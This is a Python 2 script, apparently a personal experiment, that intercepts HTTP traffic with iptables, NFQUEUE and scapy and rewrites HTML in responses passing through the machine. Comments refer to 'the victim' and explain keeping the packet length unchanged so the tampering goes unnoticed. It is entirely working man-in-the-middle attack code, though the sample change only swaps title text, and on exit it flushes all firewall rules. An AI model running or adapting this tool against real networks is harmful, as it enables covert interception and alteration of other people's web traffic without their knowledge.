#!/usr/bin/python
import argparse
from scapy.all import *
#Below is necessary to receive a response to the DHCP packets for some reason. If you know the answer to that message me.
conf.checkIPaddr=0
import threading
import urlparse
from subprocess import *
import re
import time
import os
import commands
bash=commands.getoutput
import nfqueue
import StringIO
import gzip

#Notes:
# Changing the length of the packet load at all leads to Ethernet frame sequence errors
# This leads to lots of retransmitted packets but the victim never can make a connection to the site
# Replacing content and keeping length the same works.
# gzip is a pain but must be dealt with. Can gzip handle repr(body)? Or does it have to stay as it is sent on the wire?

#os.system('/bin/echo 1 > /proc/sys/net/ipv4/ip_forward')
os.system('/sbin/iptables -t nat -A PREROUTING -p tcp --dport 80 -j NFQUEUE')
os.system('/sbin/iptables -A FORWARD -p tcp --sport 80 -j NFQUEUE')

#Why does every example do modifypkt(i, payload)? That always leads to an error for me on the q.set_callback
def modifypkt(payload):
	pkt = IP(payload.get_data())
	if pkt.haslayer(Raw):
		if 'Content-Type: text/html' in pkt[Raw].load:
			psplit = pkt[Raw].load.split('<title>This is')
#			"This is" is 7 characters so we replace them with 1234567. Modifying the length of the payload messes up the ethernet sequence number
			pkt[Raw].load = psplit[0]+'<title>1234567'+psplit[1]
#			httporiginallength = pkt[Raw].load.split('Content-Length: ')[1].split("\r")[0]
# 			'IT WORKS ' is 9 characters
#			httpnewlength = str(int(httporiginallength) + 9)
#			pkt[Raw].load = pkt[Raw].load.replace("Content-Length: " + httporiginallength, "Content-Length: " + httpnewlength)
			print pkt[Raw].load+'\n'
			del pkt[TCP].chksum
			del pkt[IP].chksum
			payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(pkt), len(pkt))

q = nfqueue.queue()
q.open()
q.bind(socket.AF_INET)
q.set_callback(modifypkt)
#q.fast_open(0, socket.AF_INET)
q.create_queue(0)
q.set_queue_maxlen(5000)
#q.get_fd()
#q.set_mode(nfqueue.NFQNL_COPY_PACKET)

try:
	q.try_run()
except KeyboardInterrupt:
	print 'Exiting...'
	os.system('iptables -X')
	os.system('iptables -F')
	os.system('iptables -t nat -F')
	os.system('iptables -t nat -X')
	q.unbind(socket.AF_INET)
	q.close()

#			if 'gzip' in pkt[Raw].load:
#				print 'content is gzippd'
#				if body != '':
#					print 'body is not empty'
#					compressedstream = StringIO.StringIO(body)
#					gzipper = gzip.GzipFile(fileobj=compressedstream)
#					data = gzipper.read()
#					print data
